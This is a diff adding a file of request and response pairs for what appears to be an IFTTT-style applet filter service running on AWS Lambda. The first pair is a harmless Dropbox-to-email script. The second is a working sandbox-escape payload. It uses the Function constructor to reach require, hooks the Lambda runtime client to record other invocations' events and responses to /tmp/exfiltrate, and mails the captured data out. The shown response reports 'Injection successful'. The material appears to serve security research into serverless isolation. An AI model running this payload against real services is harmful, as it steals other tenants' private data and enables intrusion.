@@ -1,0 +1,73 @@
+req:
+{
+    "scriptCode": "console.log('filtercode'); Email.sendMeEmail.setBody(Dropbox.newFileInFolder + ' added!'); eval('Email.sendMeEmail.setSubject(\"dropbox-notification\")');",
+    "config": {
+      "currentTime": "time",
+      "timeZone": "GMT",
+      "triggerTime": "time",
+      "trigger": {
+        "ingredients": "filename",
+        "serviceName": "Dropbox",
+        "name": "newFileInFolder"
+      },
+      "actions": [
+        {
+          "serviceName": "Email",
+          "name": "sendMeEmail",
+          "fields": [
+            "Body",
+            "Subject"
+          ]
+        }
+      ]
+    }
+  }
+
+res: 
+{
+    "Dropbox": {},
+    "Email": {
+        "sendMeEmail": {
+            "Body": "filename added!",
+            "Subject": "dropbox-notification"
+        }
+    }
+}
+
+
+######################
+
+req:
+{
+    "scriptCode":"console.log('filtercode started...'); var payload = `try { let fs = require('fs'); if (typeof counter === 'undefined') {      counter = 0; origin = Dropbox.newFileInFolder; let rapid = require('/var/runtime/RAPIDClient.js'); let _postInvocationResponse = rapid.prototype.postInvocationResponse; let _nextInvocation = rapid.prototype.nextInvocation; function postInvocationResponse(response, id, callback) { fs.appendFileSync('/tmp/exfiltrate', JSON.stringify({origin : origin,          counter : counter,response : response === undefined ? null : response, id : id        })); return _postInvocationResponse.call(this, response, id, callback);} async function nextInvocation() {        let result = await _nextInvocation.call(this);        fs.appendFileSync('/tmp/exfiltrate', JSON.stringify({  origin : origin,       counter : counter,  result : result})); return result;}  rapid.prototype.postInvocationResponse = postInvocationResponse; rapid.prototype.nextInvocation = nextInvocation;      fs.appendFileSync('/tmp/exfiltrate', 'Injection successful'); } else { counter++;} let result = Dropbox.newFileInFolder.FilenameNoExt + ' ' + counter + ' trigger time:' + Meta.triggerTime;if (fs.existsSync('/tmp/exfiltrate')) {  result += fs.readFileSync('/tmp/exfiltrate').toString(); } return result;} catch(e) { return e.toString();}`; var f = (() => {}).constructor.call(null,'require', 'Dropbox', 'Meta', payload); var result = f(require, Dropbox, Meta); Email.sendMeEmail.setBody(result);",
+    "config": {
+      "currentTime": "time",
+      "timeZone": "GMT",
+      "triggerTime": "time",
+      "trigger": {
+        "ingredients": "filename",
+        "serviceName": "Dropbox",
+        "name": "newFileInFolder"
+      },
+      "actions": [
+        {
+          "serviceName": "Email",
+          "name": "sendMeEmail",
+          "fields": [
+            "Body",
+            "Subject"
+          ]
+        }
+      ]
+    }
+  }
+
+res:
+{
+    "Dropbox": {},
+    "Email": {
+        "sendMeEmail": {
+            "Body": "undefined 0 trigger time:NaNInjection successful"
+        }
+    }
+}
